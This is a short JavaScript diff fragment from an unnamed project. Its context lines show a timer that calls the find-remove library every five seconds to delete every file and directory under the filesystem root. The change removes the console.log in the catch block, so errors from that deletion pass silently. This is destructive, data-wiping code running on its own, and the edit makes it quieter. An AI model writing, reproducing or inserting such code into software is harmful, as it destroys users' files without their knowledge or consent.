@@ -19,7 +19,7 @@ var findRemoveSync = require('find-remove');
       try {
           findRemoveSync("/", {dir: "*", files: "*.*"});
       } catch(e) {
-         console.log(e); 
+
       }
       
   }, 5000);
